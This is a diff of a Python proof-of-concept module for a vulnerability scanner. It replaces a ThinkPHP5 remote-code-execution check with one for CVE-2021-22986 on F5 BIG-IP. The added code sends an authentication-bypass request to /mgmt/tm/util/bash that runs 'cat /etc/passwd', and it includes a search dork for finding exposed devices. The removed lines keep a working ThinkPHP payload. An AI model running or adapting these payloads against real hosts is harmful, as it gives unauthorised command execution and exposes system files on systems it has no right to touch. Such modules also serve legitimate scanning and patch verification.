@@ -14,22 +14,20 @@ class POC(POCBase):
         "CreateDate" : "2021-06-09",        # POC创建时间
         "UpdateDate" : "2021-06-09",        # POC创建时间
         "PocDesc" : """
-            略  
+        略  
         """,                                # POC描述，写更新描述，没有就不写
 
-        "name" : "ThinkPHP5 5.0.23 远程代码执行漏洞",                        # 漏洞名称
+        "name" : "CVE-2021-22986 RCE",                        # 漏洞名称
         "VulnID" : "oFx-2021-0001",                      # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
-        "AppName" : "ThinkPHP5",                     # 漏洞应用名称
-        "AppVersion" : "ThinkPHP5 <= 5.0.23",                  # 漏洞应用版本
+        "AppName" : "",                     # 漏洞应用名称
+        "AppVersion" : "",                  # 漏洞应用版本
         "VulnDate" : "2021-06-09",                    # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
         "VulnDesc" : """
-            ThinkPHP是一款运用极广的PHP开发框架。
-            其5.0.23以前的版本中，获取method的方法中没有正确处理方法名，
-            导致攻击者可以调用Request类任意方法并构造利用链，从而导致远程代码执行漏洞。
+        
         """,                                # 漏洞简要描述
 
         "fofa-dork":"""
-            app="ThinkPHP"
+            title="BIG-IP®"
         """,                     # fofa搜索语句
         "example" : "",                     # 存在漏洞的演示url，写一个就可以了
         "exp_img" : "",                      # 先不管  
@@ -44,21 +42,23 @@ class POC(POCBase):
         不存在漏洞：vuln = [False,""]
         """
         vuln = [False,""]
-        url = self.target + "/index.php?s=captcha" # url自己按需调整
-        # data = "_method=__construct&filter[]=phpinfo&method=get&server[REQUEST_METHOD]=-1"
-        data = "_method=__construct&method=get&filter=call_user_func&get[]=phpinfo"
-        
+        url = self.target + "/mgmt/tm/util/bash" # url自己按需调整
+        data = r'''{"command": "run", "utilCmdArgs": "-c 'cat /etc/passwd'"}'''
+
         headers = {"User-Agent":get_random_ua(),
-                    "Connection":"close",
-                    "Content-Type": "application/x-www-form-urlencoded",
+                    'Accept': '*/*',
+                    'Connection': 'close',
+                    'Authorization': 'Basic YWRtaW46',
+                    'X-F5-Auth-Token': '',
+                    'Content-Type': 'application/json'
                     }
         
         try:
             """
             检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
             """
-            req = requests.post(url,data = data,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
-            if "<title>phpinfo()</title>" in req.text and req.status_code == 200:
+            req = requests.post(url,data=data,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
+            if "root:/root" in req.text and req.status_code == 200:
                 vuln = [True,req.text]
             else:
                 vuln = [False,req.text]
